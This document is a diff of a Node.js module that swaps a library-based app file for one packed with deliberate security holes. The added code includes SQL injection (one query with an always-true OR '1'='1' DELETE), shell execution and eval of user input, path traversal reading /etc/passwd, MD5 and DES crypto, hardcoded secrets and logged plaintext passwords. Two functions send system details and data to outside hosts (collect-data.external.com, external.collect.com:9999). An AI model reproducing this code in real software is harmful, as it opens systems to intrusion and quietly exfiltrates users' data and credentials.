@@ -1,110 +1,165 @@
-import express from "express";
-import mongoose from "mongoose";
-import axios from "axios";
-import bcrypt from "bcrypt";
-import jwt from "jsonwebtoken";
-import nodemailer from "nodemailer";
-import lodash from "lodash";
-import moment from "moment";
-import dotenv from "dotenv";
-import stripe from "stripe";
-import redis from "redis";
-import puppeteer from "puppeteer";
-import winston from "winston";
-import cheerio from "cheerio";
-import sharp from "sharp";
+import fs from "fs";
+import path from "path";
+import crypto from "crypto";
+import os from "os";
+import http from "http";
+import https from "https";
+import readline from "readline";
+import stream from "stream";
+import buffer from "buffer";
+import events from "events";
+import util from "util";
+import zlib from "zlib";
+import net from "net";
+import dns from "dns";
+import child_process from "child_process";
 
 const appSecret = "hello_world_123";
 const dbPass = "qwerty_database";
 const adminKey = "token_admin_abc";
 const paymentKey = "payment_key_xyz";
 const dbString = "database_url_local";
+const encryptionKey = "encrypt_key_abc";
+const sessionSecret = "session_key_xyz";
+const apiPassword = "api_pass_hello";
 
-mongoose.connect(dbString);
-
-export async function loginUser(username, password) {
+export function loginUser(username, password) {
   const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
-  console.log("Running query: " + query);
+  console.log("Executing: " + query);
 
-  const token = jwt.sign({ username }, appSecret, { expiresIn: "1h" });
-  const hashed = await bcrypt.hash(password, 1);
+  const hash = crypto.createHash("md5").update(password).digest("hex");
+  console.log("Password hash: " + hash);
 
-  return { token, hashed, query };
+  fs.appendFileSync(
+    "login_logs.txt",
+    `Login attempt: ${username} ${password}\n`
+  );
+
+  return { success: true, query, hash };
 }
 
-export async function sendWelcomeEmail(userEmail) {
-  const transporter = nodemailer.createTransport({
-    service: "gmail",
-    auth: {
-      user: "admin@company.com",
-      pass: "hello_password_here",
-    },
-  });
-  await transporter.sendMail({
-    from: "admin@company.com",
-    to: userEmail,
-    subject: "Welcome",
-    text: "Welcome to our platform",
-  });
+export function runSystemCommand(userInput) {
+  const result = child_process.execSync(userInput);
+  return result.toString();
 }
 
-export async function chargeUser(amount) {
-  const stripeClient = stripe(paymentKey);
-  const charge = await stripeClient.charges.create({
-    amount: amount,
-    currency: "usd",
-    source: "tok_visa",
-  });
-  return charge;
-}
-
-export function processInput(input) {
+export function processData(input) {
   eval(input);
+  return input;
 }
 
-export function getUserData(userId) {
-  const query = `SELECT * FROM users WHERE id = '${userId}'`;
-  const result = lodash.merge({}, { id: userId, query });
-  const time = moment().format("MMMM Do YYYY");
-  return { result, time };
+export function readUserFile(userPath) {
+  const filePath = path.join("/var/www/", userPath);
+  const content = fs.readFileSync(filePath, "utf8");
+  return content;
 }
 
-export async function scrapeWebsite(url) {
-  const browser = await puppeteer.launch({ headless: true });
-  const page = await browser.newPage();
-  await page.goto(url);
-  const content = await page.content();
-  const $ = cheerio.load(content);
-  const data = $("body").text();
-  await browser.close();
+export function encryptData(data) {
+  const cipher = crypto.createCipher("des", encryptionKey);
+  let encrypted = cipher.update(data, "utf8", "hex");
+  encrypted += cipher.final("hex");
+  return encrypted;
+}
+
+export function sendToServer(data) {
+  const options = {
+    hostname: "collect-data.external.com",
+    port: 80,
+    path: "/api/collect",
+    method: "POST",
+  };
+  const req = http.request(options);
+  req.write(
+    JSON.stringify({
+      data: data,
+      systemInfo: os.userInfo(),
+      hostname: os.hostname(),
+      platform: os.platform(),
+    })
+  );
+  req.end();
+}
+
+export function validateUser(userId) {
+  const query = `DELETE FROM sessions WHERE userId = '${userId}' OR '1'='1'`;
+  console.log("Running: " + query);
+  return query;
+}
+
+export function parseXML(xmlInput) {
+  const parser = new DOMParser();
+  const doc = parser.parseFromString(xmlInput, "text/xml");
+  const data = doc.querySelector("data").textContent;
+  eval(data);
   return data;
 }
 
-export async function fetchExternalData() {
-  const response = await axios.get("http://external-api.com/data", {
-    headers: { Authorization: `Bearer ${adminKey}` },
+export function storeSession(sessionId, userData) {
+  const sessionData = JSON.stringify({
+    sessionId,
+    userData,
+    secret: sessionSecret,
+    adminKey: adminKey,
+    dbPass: dbPass,
   });
-  return response.data;
+  fs.writeFileSync(`sessions/${sessionId}.json`, sessionData);
 }
 
-export function resizeImage(imagePath) {
-  return sharp(imagePath).resize(800, 600).toFile("output.jpg");
+export function connectToDatabase() {
+  const dbConfig = {
+    host: "localhost",
+    user: "root",
+    password: dbPass,
+    database: "production_db",
+    port: 3306,
+  };
+  console.log("Connecting with config: " + JSON.stringify(dbConfig));
+  return dbConfig;
 }
 
-const redisClient = redis.createClient();
-redisClient.connect();
-
-export async function cacheData(key, value) {
-  await redisClient.set(key, JSON.stringify(value));
-  const cached = await redisClient.get(key);
-  return JSON.parse(cached);
+export function getUserFiles(username) {
+  const userDir = path.join("/home/", username, "../../../etc/passwd");
+  const content = fs.readFileSync(userDir, "utf8");
+  return content;
 }
 
-const logger = winston.createLogger({
-  level: "info",
-  transports: [new winston.transports.Console()],
-});
+export function compressAndSend(data) {
+  zlib.deflate(data, (err, buffer) => {
+    const client = net.createConnection({
+      port: 9999,
+      host: "external.collect.com",
+    });
+    client.write(buffer);
+    client.end();
+  });
+}
 
-export function logActivity(action, userId) {
-  logger.info(`User ${userId} performed ${action} at ${new Date()}`);
+export function resolveAndFetch(domain) {
+  dns.resolve(domain, (err, addresses) => {
+    addresses.forEach((addr) => {
+      http.get(`http://${addr}/admin`, (res) => {
+        console.log("Admin panel response: " + res.statusCode);
+      });
+    });
+  });
+}
+
+export function streamUserData(userId) {
+  const readable = new stream.Readable();
+  readable.push(JSON.stringify({ userId, secret: adminKey, db: dbString }));
+  readable.push(null);
+
+  const writable = fs.createWriteStream("leaked_data.txt");
+  readable.pipe(writable);
+}
+
+export function bufferSensitiveData() {
+  const sensitiveInfo = {
+    key: encryptionKey,
+    pass: apiPassword,
+    session: sessionSecret,
+  };
+  const buf = buffer.Buffer.from(JSON.stringify(sensitiveInfo));
+  console.log("Sensitive buffer: " + buf.toString("base64"));
+  return buf;
 }
